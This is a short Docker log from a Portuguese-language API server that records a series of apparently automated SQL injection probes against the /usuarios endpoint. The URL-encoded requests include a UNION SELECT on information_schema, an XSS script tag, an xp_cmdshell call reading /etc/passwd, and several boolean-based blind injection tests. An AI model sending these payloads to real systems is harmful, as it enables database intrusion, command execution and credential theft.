api-1  | Servidor rodando em http://0.0.0.0:8000
api-1  | 172.18.0.1 - GET /usuarios HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios?zjHX=2586%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23 HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios HTTP/1.1
api-1  | 172.18.0.1 - GET /9988 HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios%28%28..%29%22%27%2C%2C. HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios%27xHaMnA%3C%27%22%3EZEdvho HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios%29%2F%2A%2A%2FAND%2F%2A%2A%2F8006%3D4715%2F%2A%2A%2FAND%2F%2A%2A%2F%282586%3D2586 HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios%29%2F%2A%2A%2FAND%2F%2A%2A%2F8390%3D8390%2F%2A%2A%2FAND%2F%2A%2A%2F%282214%3D2214 HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios%2F%2A%2A%2FAND%2F%2A%2A%2F8513%3D5189 HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios%2F%2A%2A%2FAND%2F%2A%2A%2F8390%3D8390 HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F6719%3D6831%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27WAzo%27%3D%27WAzo HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F8390%3D8390%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27LrdW%27%3D%27LrdW HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios%27%2F%2A%2A%2FAND%2F%2A%2A%2F8112%3D4700%2F%2A%2A%2FAND%2F%2A%2A%2F%27Xody%27%3D%27Xody HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios%27%2F%2A%2A%2FAND%2F%2A%2A%2F8390%3D8390%2F%2A%2A%2FAND%2F%2A%2A%2F%27TNPe%27%3D%27TNPe HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios%2F%2A%2A%2FAND%2F%2A%2A%2F7358%3D5725--%2F%2A%2A%2FggEB HTTP/1.1
